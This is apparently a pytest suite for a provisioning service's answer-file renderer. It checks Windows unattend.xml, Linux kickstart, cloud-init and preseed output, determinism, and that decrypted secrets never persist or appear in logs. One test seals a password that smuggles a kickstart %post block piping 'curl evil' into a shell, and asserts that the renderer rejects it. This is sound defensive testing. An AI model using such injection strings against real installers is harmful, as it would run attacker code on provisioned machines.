"""Tests for the answer-file renderer (docs/modules/provisioning/spec.md).

This is the ONLY place run secrets + the enrollment token materialize
together. Secret-absence and determinism are the security-critical
assertions here: the renderer must decrypt sealed credential refs at render
time only, inject the plaintext into the returned bytes, and never leak the
plaintext into the persisted `post_config` row, any audit event, or any log
line. The function must also be a pure/deterministic function of
`(profile, image, token)` — `now` is accepted for interface symmetry only
and must never affect the output.
"""

import logging
import xml.etree.ElementTree as ET
from datetime import UTC, datetime
from pathlib import Path
from uuid import uuid4

import pytest
import yaml
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncEngine, AsyncSession

from app.core.client_scope import ClientScope
from app.core.tenancy import org_session
from app.core.vault import LocalVaultService
from app.models import AuditEvent, Organization
from app.modules.provisioning.render import render_answer_file
from app.modules.provisioning.repository import (
    SEALED_MARKER,
    ProvisioningValidationError,
    create_image,
    upsert_profile,
)


async def _org(admin_engine: AsyncEngine) -> tuple[object, object]:
    slug = f"prov-render-{uuid4().hex[:6]}"
    async with AsyncSession(admin_engine, expire_on_commit=False) as session:
        org = Organization(name=slug, slug=slug)
        session.add(org)
        await session.commit()
        return org.id, uuid4()


def _post_config() -> dict:
    return {
        "domain_join": {"user": "svc", "password": "s3cret"},
        "local_admin": {"password": "adminpw"},
        "hostname": "WK-0001",
    }


async def _make_windows_profile(
    session: AsyncSession, vault: LocalVaultService, org_id: object, actor_id: object
) -> tuple[object, object]:
    image = await create_image(
        session,
        org_id=org_id,
        os_family="windows",
        name="Windows 11 Pro",
        kind="image",
        params={},
        actor_id=actor_id,
        actor_type="user",
    )
    profile = await upsert_profile(
        session,
        vault,
        org_id=org_id,
        name="Standard Win11",
        image_id=image.id,
        post_config=_post_config(),
        target_scope={"all": True},
        enabled=True,
        actor_id=actor_id,
        actor_type="user",
    )
    return image, profile


# ---------------------------------------------------------------------------
# windows: valid unattend.xml with hostname, domain-join user, injected
# secrets, and the token
# ---------------------------------------------------------------------------


async def test_render_windows_produces_valid_xml_with_injected_secrets_and_token(
    admin_engine: AsyncEngine, app_engine: AsyncEngine, tmp_path: Path
) -> None:
    vault = LocalVaultService(tmp_path / "root.key")
    org_id, actor_id = await _org(admin_engine)
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        image, profile = await _make_windows_profile(session, vault, org_id, actor_id)
        await session.commit()

        rendered = await render_answer_file(
            session,
            vault,
            org_id=org_id,
            profile=profile,
            image=image,
            token="tok123",
            now=datetime(2026, 7, 23, tzinfo=UTC),
        )

    assert isinstance(rendered, bytes)
    # valid XML
    ET.fromstring(rendered)

    text = rendered.decode()
    assert "WK-0001" in text
    assert "svc" in text
    assert "s3cret" in text
    assert "adminpw" in text
    assert "tok123" in text


# ---------------------------------------------------------------------------
# determinism + now-independence
# ---------------------------------------------------------------------------


async def test_render_windows_is_byte_deterministic(
    admin_engine: AsyncEngine, app_engine: AsyncEngine, tmp_path: Path
) -> None:
    vault = LocalVaultService(tmp_path / "root.key")
    org_id, actor_id = await _org(admin_engine)
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        image, profile = await _make_windows_profile(session, vault, org_id, actor_id)
        await session.commit()

        first = await render_answer_file(
            session,
            vault,
            org_id=org_id,
            profile=profile,
            image=image,
            token="tok123",
            now=datetime(2026, 7, 23, tzinfo=UTC),
        )
        second = await render_answer_file(
            session,
            vault,
            org_id=org_id,
            profile=profile,
            image=image,
            token="tok123",
            now=datetime(2026, 7, 23, tzinfo=UTC),
        )

    assert first == second


async def test_render_windows_is_now_independent(
    admin_engine: AsyncEngine, app_engine: AsyncEngine, tmp_path: Path
) -> None:
    vault = LocalVaultService(tmp_path / "root.key")
    org_id, actor_id = await _org(admin_engine)
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        image, profile = await _make_windows_profile(session, vault, org_id, actor_id)
        await session.commit()

        first = await render_answer_file(
            session,
            vault,
            org_id=org_id,
            profile=profile,
            image=image,
            token="tok123",
            now=datetime(2020, 1, 1, tzinfo=UTC),
        )
        second = await render_answer_file(
            session,
            vault,
            org_id=org_id,
            profile=profile,
            image=image,
            token="tok123",
            now=datetime(2099, 12, 31, tzinfo=UTC),
        )

    assert first == second


# ---------------------------------------------------------------------------
# secret-absence: persisted row, audit events, logs
# ---------------------------------------------------------------------------


async def test_render_leaves_no_secret_trace_in_db_audit_or_logs(
    admin_engine: AsyncEngine,
    app_engine: AsyncEngine,
    tmp_path: Path,
    caplog: pytest.LogCaptureFixture,
) -> None:
    vault = LocalVaultService(tmp_path / "root.key")
    org_id, actor_id = await _org(admin_engine)
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        image, profile = await _make_windows_profile(session, vault, org_id, actor_id)
        await session.commit()
        profile_id = profile.id

    events_before = 0
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        events_before = len(
            (await session.execute(select(AuditEvent).where(AuditEvent.org_id == org_id)))
            .scalars()
            .all()
        )

    with caplog.at_level(logging.DEBUG):
        async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
            image_row = image
            profile_row = (
                await session.execute(
                    select(type(profile)).where(
                        type(profile).org_id == org_id, type(profile).id == profile_id
                    )
                )
            ).scalar_one()
            rendered = await render_answer_file(
                session,
                vault,
                org_id=org_id,
                profile=profile_row,
                image=image_row,
                token="tok123",
                now=datetime(2026, 7, 23, tzinfo=UTC),
            )

    # the secrets ARE in the returned bytes
    assert b"s3cret" in rendered
    assert b"adminpw" in rendered

    # ... but nowhere else: not in the persisted post_config row
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        row = (
            await session.execute(
                select(type(profile)).where(
                    type(profile).org_id == org_id, type(profile).id == profile_id
                )
            )
        ).scalar_one()
        events_after = (
            (await session.execute(select(AuditEvent).where(AuditEvent.org_id == org_id)))
            .scalars()
            .all()
        )

    persisted_str = str(row.post_config)
    assert "s3cret" not in persisted_str
    assert "adminpw" not in persisted_str

    # the sealed-marker SHAPE survives rendering unchanged (a regression that
    # nulled/emptied the sealed fields would be caught here even though the
    # plaintext-absence check above would not notice it)
    domain_join_password = row.post_config["domain_join"]["password"]
    local_admin_password = row.post_config["local_admin"]["password"]
    assert isinstance(domain_join_password, dict)
    assert set(domain_join_password.keys()) == {SEALED_MARKER}
    assert isinstance(domain_join_password[SEALED_MARKER], str)
    assert domain_join_password[SEALED_MARKER]
    assert isinstance(local_admin_password, dict)
    assert set(local_admin_password.keys()) == {SEALED_MARKER}
    assert isinstance(local_admin_password[SEALED_MARKER], str)
    assert local_admin_password[SEALED_MARKER]

    # not in any audit event (and the render itself wrote no new event)
    assert len(events_after) == events_before
    for event in events_after:
        meta_str = str(event.meta)
        assert "s3cret" not in meta_str
        assert "adminpw" not in meta_str

    # not in any captured log line
    for record in caplog.records:
        assert "s3cret" not in record.getMessage()
        assert "adminpw" not in record.getMessage()
        assert "tok123" not in record.getMessage()


# ---------------------------------------------------------------------------
# linux: installer dispatch
# ---------------------------------------------------------------------------


async def test_render_linux_kickstart_contains_token(
    admin_engine: AsyncEngine, app_engine: AsyncEngine, tmp_path: Path
) -> None:
    vault = LocalVaultService(tmp_path / "root.key")
    org_id, actor_id = await _org(admin_engine)
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        image = await create_image(
            session,
            org_id=org_id,
            os_family="linux",
            name="Ubuntu 24.04",
            kind="build",
            params={"installer": "kickstart"},
            actor_id=actor_id,
            actor_type="user",
        )
        profile = await upsert_profile(
            session,
            vault,
            org_id=org_id,
            name="Standard Linux",
            image_id=image.id,
            post_config={"hostname": "lx-0001"},
            target_scope={},
            enabled=True,
            actor_id=actor_id,
            actor_type="user",
        )
        await session.commit()

        rendered = await render_answer_file(
            session,
            vault,
            org_id=org_id,
            profile=profile,
            image=image,
            token="tok456",
            now=datetime(2026, 7, 23, tzinfo=UTC),
        )

    text = rendered.decode()
    assert "tok456" in text
    assert "lx-0001" in text


async def test_render_linux_cloud_init(
    admin_engine: AsyncEngine, app_engine: AsyncEngine, tmp_path: Path
) -> None:
    vault = LocalVaultService(tmp_path / "root.key")
    org_id, actor_id = await _org(admin_engine)
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        image = await create_image(
            session,
            org_id=org_id,
            os_family="linux",
            name="Ubuntu 24.04 cloud",
            kind="build",
            params={"installer": "cloud-init"},
            actor_id=actor_id,
            actor_type="user",
        )
        profile = await upsert_profile(
            session,
            vault,
            org_id=org_id,
            name="Cloud Linux",
            image_id=image.id,
            post_config={"hostname": "lx-cloud"},
            target_scope={},
            enabled=True,
            actor_id=actor_id,
            actor_type="user",
        )
        await session.commit()

        rendered = await render_answer_file(
            session,
            vault,
            org_id=org_id,
            profile=profile,
            image=image,
            token="tokcloud",
            now=datetime(2026, 7, 23, tzinfo=UTC),
        )

    text = rendered.decode()
    assert "#cloud-config" in text
    assert "tokcloud" in text
    assert "lx-cloud" in text


async def test_render_linux_preseed(
    admin_engine: AsyncEngine, app_engine: AsyncEngine, tmp_path: Path
) -> None:
    vault = LocalVaultService(tmp_path / "root.key")
    org_id, actor_id = await _org(admin_engine)
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        image = await create_image(
            session,
            org_id=org_id,
            os_family="linux",
            name="Debian 12",
            kind="build",
            params={"installer": "preseed"},
            actor_id=actor_id,
            actor_type="user",
        )
        profile = await upsert_profile(
            session,
            vault,
            org_id=org_id,
            name="Debian preseed",
            image_id=image.id,
            post_config={"hostname": "lx-preseed"},
            target_scope={},
            enabled=True,
            actor_id=actor_id,
            actor_type="user",
        )
        await session.commit()

        rendered = await render_answer_file(
            session,
            vault,
            org_id=org_id,
            profile=profile,
            image=image,
            token="tokpreseed",
            now=datetime(2026, 7, 23, tzinfo=UTC),
        )

    text = rendered.decode()
    assert "tokpreseed" in text
    assert "lx-preseed" in text


async def test_render_linux_missing_installer_raises(
    admin_engine: AsyncEngine, app_engine: AsyncEngine, tmp_path: Path
) -> None:
    vault = LocalVaultService(tmp_path / "root.key")
    org_id, actor_id = await _org(admin_engine)
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        image = await create_image(
            session,
            org_id=org_id,
            os_family="linux",
            name="No installer",
            kind="build",
            params={},
            actor_id=actor_id,
            actor_type="user",
        )
        profile = await upsert_profile(
            session,
            vault,
            org_id=org_id,
            name="Broken",
            image_id=image.id,
            post_config={"hostname": "lx-broken"},
            target_scope={},
            enabled=True,
            actor_id=actor_id,
            actor_type="user",
        )
        await session.commit()

        with pytest.raises(ProvisioningValidationError):
            await render_answer_file(
                session,
                vault,
                org_id=org_id,
                profile=profile,
                image=image,
                token="tok",
                now=datetime(2026, 7, 23, tzinfo=UTC),
            )


async def test_render_linux_unknown_installer_raises(
    admin_engine: AsyncEngine, app_engine: AsyncEngine, tmp_path: Path
) -> None:
    vault = LocalVaultService(tmp_path / "root.key")
    org_id, actor_id = await _org(admin_engine)
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        image = await create_image(
            session,
            org_id=org_id,
            os_family="linux",
            name="Weird installer",
            kind="build",
            params={"installer": "bogus"},
            actor_id=actor_id,
            actor_type="user",
        )
        profile = await upsert_profile(
            session,
            vault,
            org_id=org_id,
            name="Broken2",
            image_id=image.id,
            post_config={"hostname": "lx-broken2"},
            target_scope={},
            enabled=True,
            actor_id=actor_id,
            actor_type="user",
        )
        await session.commit()

        with pytest.raises(ProvisioningValidationError):
            await render_answer_file(
                session,
                vault,
                org_id=org_id,
                profile=profile,
                image=image,
                token="tok",
                now=datetime(2026, 7, 23, tzinfo=UTC),
            )


# ---------------------------------------------------------------------------
# linux: config injection via control characters in a sealed credential must
# be rejected, not interpolated verbatim into installer directives
# ---------------------------------------------------------------------------


async def test_render_linux_rejects_newline_in_credential(
    admin_engine: AsyncEngine, app_engine: AsyncEngine, tmp_path: Path
) -> None:
    vault = LocalVaultService(tmp_path / "root.key")
    org_id, actor_id = await _org(admin_engine)
    evil_password = "pw\n%post\ncurl evil|sh\n%end"
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        image = await create_image(
            session,
            org_id=org_id,
            os_family="linux",
            name="Ubuntu evil",
            kind="build",
            params={"installer": "kickstart"},
            actor_id=actor_id,
            actor_type="user",
        )
        # seal a credential whose plaintext contains a newline + injected
        # installer directives: upsert_profile does not validate credential
        # content, only render_answer_file must reject it.
        profile = await upsert_profile(
            session,
            vault,
            org_id=org_id,
            name="Evil linux",
            image_id=image.id,
            post_config={
                "local_admin": {"password": evil_password},
                "hostname": "lx-evil",
            },
            target_scope={},
            enabled=True,
            actor_id=actor_id,
            actor_type="user",
        )
        await session.commit()

        with pytest.raises(ProvisioningValidationError):
            await render_answer_file(
                session,
                vault,
                org_id=org_id,
                profile=profile,
                image=image,
                token="tok",
                now=datetime(2026, 7, 23, tzinfo=UTC),
            )


async def test_render_cloudinit_quotes_injected_values(
    admin_engine: AsyncEngine, app_engine: AsyncEngine, tmp_path: Path
) -> None:
    """A YAML-hostile credential value (colon, bang, hash, spaces) must not
    break the cloud-init document's structure: the rendered text must still
    parse as YAML and round-trip the exact injected value."""
    vault = LocalVaultService(tmp_path / "root.key")
    org_id, actor_id = await _org(admin_engine)
    hostile_password = "sec:ret! #pw with spaces"
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        image = await create_image(
            session,
            org_id=org_id,
            os_family="linux",
            name="Ubuntu hostile",
            kind="build",
            params={"installer": "cloud-init"},
            actor_id=actor_id,
            actor_type="user",
        )
        profile = await upsert_profile(
            session,
            vault,
            org_id=org_id,
            name="Cloud hostile",
            image_id=image.id,
            post_config={
                "local_admin": {"password": hostile_password},
                "domain_join": {"user": "svc", "password": "s3cret"},
                "hostname": "lx-hostile",
            },
            target_scope={},
            enabled=True,
            actor_id=actor_id,
            actor_type="user",
        )
        await session.commit()

        rendered = await render_answer_file(
            session,
            vault,
            org_id=org_id,
            profile=profile,
            image=image,
            token="tokhostile",
            now=datetime(2026, 7, 23, tzinfo=UTC),
        )

    text = rendered.decode()
    assert text.startswith("#cloud-config\n")
    doc = yaml.safe_load(text[len("#cloud-config\n") :])
    assert doc["hostname"] == "lx-hostile"
    assert doc["chpasswd"]["list"] == f"root:{hostile_password}\nsvc:s3cret"


async def test_render_linux_is_now_independent(
    admin_engine: AsyncEngine, app_engine: AsyncEngine, tmp_path: Path
) -> None:
    vault = LocalVaultService(tmp_path / "root.key")
    org_id, actor_id = await _org(admin_engine)
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        image = await create_image(
            session,
            org_id=org_id,
            os_family="linux",
            name="Ubuntu deterministic",
            kind="build",
            params={"installer": "cloud-init"},
            actor_id=actor_id,
            actor_type="user",
        )
        profile = await upsert_profile(
            session,
            vault,
            org_id=org_id,
            name="Cloud deterministic",
            image_id=image.id,
            post_config=_post_config(),
            target_scope={},
            enabled=True,
            actor_id=actor_id,
            actor_type="user",
        )
        await session.commit()

        first = await render_answer_file(
            session,
            vault,
            org_id=org_id,
            profile=profile,
            image=image,
            token="tokdet",
            now=datetime(2020, 1, 1, tzinfo=UTC),
        )
        second = await render_answer_file(
            session,
            vault,
            org_id=org_id,
            profile=profile,
            image=image,
            token="tokdet",
            now=datetime(2099, 12, 31, tzinfo=UTC),
        )

    assert first == second


# ---------------------------------------------------------------------------
# macos: no answer file
# ---------------------------------------------------------------------------


async def test_render_macos_raises(
    admin_engine: AsyncEngine, app_engine: AsyncEngine, tmp_path: Path
) -> None:
    vault = LocalVaultService(tmp_path / "root.key")
    org_id, actor_id = await _org(admin_engine)
    async with org_session(org_id, engine=app_engine, clients=ClientScope.all()) as session:
        image = await create_image(
            session,
            org_id=org_id,
            os_family="macos",
            name="macOS enrollment",
            kind="enrollment",
            params={},
            actor_id=actor_id,
            actor_type="user",
        )
        profile = await upsert_profile(
            session,
            vault,
            org_id=org_id,
            name="macOS profile",
            image_id=image.id,
            post_config={"hostname": "mac-0001"},
            target_scope={},
            enabled=True,
            actor_id=actor_id,
            actor_type="user",
        )
        await session.commit()

        with pytest.raises(ProvisioningValidationError):
            await render_answer_file(
                session,
                vault,
                org_id=org_id,
                profile=profile,
                image=image,
                token="tok",
                now=datetime(2026, 7, 23, tzinfo=UTC),
            )
